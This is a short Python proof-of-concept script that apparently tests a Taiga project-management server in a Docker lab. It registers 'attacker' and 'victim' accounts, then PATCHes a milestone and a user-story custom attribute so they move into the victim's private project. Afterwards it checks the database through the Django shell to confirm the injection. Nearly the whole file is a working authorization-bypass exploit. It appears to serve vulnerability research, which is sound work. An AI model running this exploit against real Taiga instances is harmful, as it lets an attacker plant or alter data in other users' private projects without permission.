import sys, subprocess; sys.path.insert(0, "/root/johto-task4/L2/scratch/proofs")
from lib import Client, register, uniq, new_project, show

attacker = register(uniq("r2atk2b")); victim = register(uniq("r2vic2b"))
A = new_project(attacker, private=True); B = new_project(victim, private=True)
print("A",A["id"],"B",B["id"])

# Milestone injection
m = attacker.post("/milestones", {"project": A["id"], "name": "INJ-sprint",
    "estimated_start":"2026-01-01","estimated_finish":"2026-01-15"}).json()
r = attacker.patch("/milestones/%d" % m["id"], {"project": B["id"]})
show("PATCH milestone.project -> B(victim)", r, keys=["id","project","_error_message"])

# Custom attribute (US) injection
ca = attacker.post("/userstory-custom-attributes", {"project": A["id"], "name":"INJ-field"}).json()
r = attacker.patch("/userstory-custom-attributes/%d" % ca["id"], {"project": B["id"]})
show("PATCH US-custom-attr.project -> B(victim)", r, keys=["id","project","_error_message"])

code=("from taiga.projects.milestones.models import Milestone\n"
      "from taiga.projects.custom_attributes.models import UserStoryCustomAttribute as C\n"
      "print('milestone', Milestone.objects.get(pk=%d).project_id)\n"
      "print('custom_attr', C.objects.get(pk=%d).project_id)\n"%(m["id"],ca["id"]))
out=subprocess.run(["docker","exec","t4-L2-app","python","manage.py","shell","-c",code],capture_output=True,text=True)
print(out.stdout.strip(), out.stderr.strip()[-200:] if out.returncode else "")
